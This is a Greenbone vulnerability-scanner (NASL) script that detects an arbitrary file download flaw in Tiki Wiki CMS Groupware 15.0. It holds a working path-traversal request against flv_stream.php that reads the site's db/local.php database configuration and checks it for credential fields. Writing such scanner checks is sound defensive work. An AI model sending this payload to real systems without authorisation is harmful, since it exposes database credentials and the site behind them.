# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:tiki:tikiwiki_cms%2fgroupware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808576");
  script_version("2025-03-19T05:38:35+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-03-19 05:38:35 +0000 (Wed, 19 Mar 2025)");
  script_tag(name:"creation_date", value:"2016-07-12 12:32:54 +0530 (Tue, 12 Jul 2016)");

  script_name("Tiki Wiki CMS Groupware Arbitrary File Download Vulnerability (Jul 2016)");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_tikiwiki_http_detect.nasl");
  script_mandatory_keys("tiki/wiki/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Tiki Wiki CMS Groupware is prone to arbitrary file download
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and check whether it is
  able to download an arbitrary file.");

  script_tag(name:"insight", value:"The Flaw is due to improper sanitization of input passed to
  the 'flv_stream.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to gain
  access to arbitrary files and to compromise the application.");

  script_tag(name:"affected", value:"Tiki Wiki CMS Groupware version 15.0.");

  script_tag(name:"solution", value:"Update to version 15.1 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://tiki.org");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40080");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/vendor/player/flv/flv_stream.php?file=../../../db/local.php&position=0";

if( http_vuln_check( port:port, url:url, check_header:TRUE, pattern:"dbversion_tiki",
                     extra_check:make_list("user_tiki", "host_tiki", "dbs_tiki" ) ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
